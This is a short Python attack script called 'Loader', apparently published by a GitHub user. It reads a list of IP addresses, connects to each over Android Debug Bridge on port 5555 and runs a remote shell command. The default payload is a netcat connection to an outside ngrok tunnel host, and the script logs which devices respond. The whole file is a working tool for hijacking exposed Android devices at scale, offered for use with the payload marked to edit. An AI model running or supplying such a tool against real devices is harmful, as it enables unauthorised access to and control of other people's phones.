import sys
import subprocess

payload = "nc 0.tcp.ngrok.io 1470" # Edit this!


# Loader
# Date: 08/21/21
# Author: 0x1CA3


banner = """ 
                .____                     .___            
                |    |    _________     __| _/___________ 
                |    |   /  _ \__  \   / __ |/ __ \_  __ \\
                |    |__(  <_> ) __ \_/ /_/ \  ___/|  | \/
                |_______ \____(____  /\____ |\___  >__|   
                        \/         \/      \/    \/       
                 [Made by https://github.com/0x1CA3]
"""

def scan(line):
    subprocess.call("adb start-server", shell=True)
    subprocess.call(f"adb connect {line}:5555", shell=True)
        
    output = subprocess.Popen(["adb", "devices"], stdout=subprocess.PIPE).communicate()[0]
    if 'offline' not in str(output):
        print(f"Online! -> {line}")
    subprocess.call("adb kill-server", shell=True)
    subprocess.call(f"adb shell {payload}", shell=True)
    
    save_data = open("results.txt", "a")
    save_data.write(f"{line}")

def get_data(targets):
    devices_list = open(targets, "r")
    devices_data = devices_list.readlines()
    for line in devices_data:
        scan(line)

def main():
    print(banner)
    if len(sys.argv) < 2:
        print("Usage: python3 loader.py [FILE]")
        sys.exit()
    targets = sys.argv[1]
    get_data(targets)
main()